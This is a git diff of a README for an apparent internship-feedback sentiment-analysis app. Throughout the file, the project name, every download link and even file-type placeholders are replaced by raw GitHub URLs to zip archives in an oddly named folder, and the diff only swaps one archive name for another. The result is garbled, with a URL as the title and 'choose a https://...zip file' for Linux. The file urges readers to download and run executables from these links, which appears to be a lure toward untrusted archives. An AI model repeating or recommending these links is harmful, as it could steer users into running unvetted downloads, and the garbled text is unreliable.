@@ -1,10 +1,10 @@
-# 🌟 https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/Internee.pk-DataAnalytics_Internship-Assignment7-v3.9.zip - Analyze Internship Feedback Easily
+# 🌟 https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/pk-Assignment-Internship-Analytics-Data-Internee-3.0.zip - Analyze Internship Feedback Easily
 
-[![Download Now](https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/Internee.pk-DataAnalytics_Internship-Assignment7-v3.9.zip%https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/Internee.pk-DataAnalytics_Internship-Assignment7-v3.9.zip)](https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/Internee.pk-DataAnalytics_Internship-Assignment7-v3.9.zip)
+[![Download Now](https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/pk-Assignment-Internship-Analytics-Data-Internee-3.0.zip%https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/pk-Assignment-Internship-Analytics-Data-Internee-3.0.zip)](https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/pk-Assignment-Internship-Analytics-Data-Internee-3.0.zip)
 
 ## 🌐 Overview
 
-https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/Internee.pk-DataAnalytics_Internship-Assignment7-v3.9.zip focuses on analyzing internship feedback using sentiment analysis. The application processes and visualizes feedback to reveal student emotions and opinions. It highlights trends that show positive, negative, and neutral sentiments across various internship roles and times. Key insights help identify strengths and areas for improvement.
+https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/pk-Assignment-Internship-Analytics-Data-Internee-3.0.zip focuses on analyzing internship feedback using sentiment analysis. The application processes and visualizes feedback to reveal student emotions and opinions. It highlights trends that show positive, negative, and neutral sentiments across various internship roles and times. Key insights help identify strengths and areas for improvement.
 
 ## 🚀 Getting Started
 
@@ -20,12 +20,12 @@ This guide helps you download and run the application successfully. Follow these
 
 ## 💻 How to Download & Install
 
-1. **Visit the Releases Page:** To download the latest version of the application, [visit this page to download](https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/Internee.pk-DataAnalytics_Internship-Assignment7-v3.9.zip). 
+1. **Visit the Releases Page:** To download the latest version of the application, [visit this page to download](https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/pk-Assignment-Internship-Analytics-Data-Internee-3.0.zip). 
 
 2. **Choose the Right File:** On the releases page, find the latest version. Select the file that matches your operating system. For example:
    - If you use Windows, look for a `.exe` file. 
    - If you use macOS, look for a `.dmg` file.
-   - If you are on Linux, choose a `https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/Internee.pk-DataAnalytics_Internship-Assignment7-v3.9.zip` file.
+   - If you are on Linux, choose a `https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/pk-Assignment-Internship-Analytics-Data-Internee-3.0.zip` file.
 
 3. **Download the File:** Click on the download link. The file will start downloading to your computer.
 
@@ -35,7 +35,7 @@ This guide helps you download and run the application successfully. Follow these
    - **For macOS:** 
      - Open the downloaded `.dmg` file. Drag the application into your Applications folder. Open it from there. 
    - **For Linux:** 
-     - Extract the `https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/Internee.pk-DataAnalytics_Internship-Assignment7-v3.9.zip` file using the terminal or a file manager. Navigate to the extracted folder and run the application with the command line.
+     - Extract the `https://raw.githubusercontent.com/umachinwendujuliet/Internee.pk-DataAnalytics_Internship-Assignment7/main/morigerous/pk-Assignment-Internship-Analytics-Data-Internee-3.0.zip` file using the terminal or a file manager. Navigate to the extracted folder and run the application with the command line.
 
 5. **Follow Initial Setup Instructions:** Upon launching the application, follow the on-screen prompts to complete the setup. This process usually takes a few minutes.
 
